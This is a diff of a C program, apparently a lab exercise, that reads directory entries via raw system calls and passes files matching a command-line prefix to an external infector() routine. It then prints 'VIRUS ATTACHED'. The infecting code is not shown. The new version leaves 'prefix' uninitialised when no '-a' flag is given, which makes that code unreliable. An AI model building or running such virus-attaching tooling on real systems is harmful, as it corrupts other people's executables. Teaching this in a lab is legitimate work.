@@ -1,57 +1,63 @@
 #include "Util.h"
+#include "dirent.h"
 
 #define SYS_WRITE 4
-#define SYS_OPEN 5
-#define SYS_CLOSE 6
-#define SYS_GETDENTS 141
-#define SYS_EXIT 1
 #define STDOUT 1
-#define STDERR 2
-#define BUF_SIZE 8192
+#define SYS_OPEN 5
+#define O_RDWR 2
+#define SYS_SEEK 19
+#define SYS_GETDENTS 141
+#define SEEK_SET 0
+#define SHIRA_OFFSET 0x291
 
-struct linux_dirent {
-    unsigned long  d_ino;
-    unsigned long  d_off;
-    unsigned short d_reclen;
-    char           d_name[];
+struct linux_dirent
+{
+  unsigned long d_ino;     /* Inode number */
+  unsigned long d_off;     /* Offset to next linux_dirent */
+  unsigned short d_reclen; /* Length of this linux_dirent */
+  char d_name[];           /* Filename (null-terminated) */
+                           /* length is actually (d_reclen - 2 -
+                                                  offsetof(struct linux_dirent, d_name)) */
 };
 
 extern int system_call();
-extern void infection();
-extern void infector(char *file);
+extern int infector();
 
-int main(int argc, char *argv[], char *envp[]) {
-    char buf[BUF_SIZE];
-    struct linux_dirent *d;
-    int fd, nread, bpos;
+int main(int argc, char *argv[], char *envp[])
+{
+  int file_descriptor;
+  long i;
+  int bytes_read;
+  char buffer[8192];
+  struct linux_dirent *d;
+  char *prefix;
 
-    fd = system_call(SYS_OPEN, ".", 0, 0777);
-    if (fd < 0) {
-        system_call(SYS_WRITE, STDERR, "Error: Cannot open directory\n", 29);
-        system_call(SYS_EXIT, 0x55);
+  for (i = 1; i < argc; i++)
+    if (argv[i][0] == '-' && argv[i][1] == 'a')
+      prefix = argv[i] + 2;
+
+  file_descriptor = system_call(SYS_OPEN, ".", 0, 0644);
+  if (file_descriptor < 0)
+    return 0x55;
+
+  bytes_read = system_call(SYS_GETDENTS, file_descriptor, buffer, 8192);
+  if (bytes_read < 0)
+    return 0x55;
+
+  for (i = 0; i < bytes_read;)
+  {
+    d = (struct linux_dirent *)(buffer + i);
+    system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
+
+    if (prefix && strncmp(prefix, d->d_name, strlen(prefix)) == 0)
+    {
+      infector(d->d_name);
+      system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED", 15);
     }
 
-    nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
-    if (nread < 0) {
-        system_call(SYS_WRITE, STDERR, "Error: Cannot read directory\n", 29);
-        system_call(SYS_EXIT, 0x55);
-    }
+    system_call(SYS_WRITE, STDOUT, "\n", 1);
+    i += d->d_reclen;
+  }
 
-    for (bpos = 0; bpos < nread;) {
-        d = (struct linux_dirent *)(buf + bpos);
-        system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
-        system_call(SYS_WRITE, STDOUT, "\n", 1);
-
-        if (argc > 1 && argv[1][0] == '-' && argv[1][1] == 'a') {
-            char *prefix = argv[1] + 2;
-            if (strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
-                infector(d->d_name);
-                system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED\n", 15);
-            }
-        }
-        bpos += d->d_reclen;
-    }
-
-    system_call(SYS_CLOSE, fd);
-    return 0;
+  return 0;
 }
